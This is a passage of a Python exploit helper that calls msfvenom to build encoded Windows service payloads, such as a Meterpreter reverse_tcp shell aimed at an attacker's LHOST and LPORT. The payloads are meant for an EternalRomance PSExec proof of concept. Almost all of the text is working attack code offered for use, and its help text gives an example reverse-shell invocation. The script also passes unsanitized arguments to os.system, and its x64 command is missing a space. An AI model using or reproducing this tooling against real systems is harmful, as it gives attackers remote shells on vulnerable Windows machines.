...
def payload_generation(payloadType ,Lhost ,Lport ,Arch, target):
	if Arch == 'x86':
		cmd=('msfvenom -p '+str(payloadType)+ ' LHOST='+str(Lhost)+ ' LPORT='+str(Lport)+' -a '+str(Arch)+' -b \'\\x00\\x01\' -e x86/shikata_ga_nai -f exe-service > /tmp/'+str(target)+'-serv.exe')
	elif Arch == 'x64':
		cmd=('msfvenom -p '+str(payloadType)+ ' LHOST='+str(Lhost)+ ' LPORT='+str(Lport)+' -a '+str(Arch)+' -b \'\\x00\\x01\'-e x64/zutto_dekiru -f exe-service > /tmp/'+str(target)+'-serv.exe')
	print('Calling venom on '+str(cmd))
	os.system(cmd)
	print('Payload Stored /tmp/')
...
if len(sys.argv) < 6:
	print("""	Some on the fly shells using the EternalRomance PSExec PoC - requires msfvenom :)

	
	Help: {} <IP> <Payload Type i.e windows/meterpreter/reverse_tcp> <LHOST> <LPORT> <Arch x86|x64> [Optional Pipe Name]
	Example: 192.168.0.1 windows/meterpreter/reverse_tcp 192.168.0.2 1234 x86 browser""".format(sys.argv[0]))
	sys.exit(1)
...
lport = sys.argv[4]
arch1 = sys.argv[5]
pipe_name = None if len(sys.argv) < 7 else sys.argv[6]
payload_generation(payType, lhost, lport, arch1, target)
exists = os.path.isfile('/tmp/'+target+'-serv.exe')
if exists:
	print('Payload looks good!')
else:
	sys.exit('Bad Payload!')
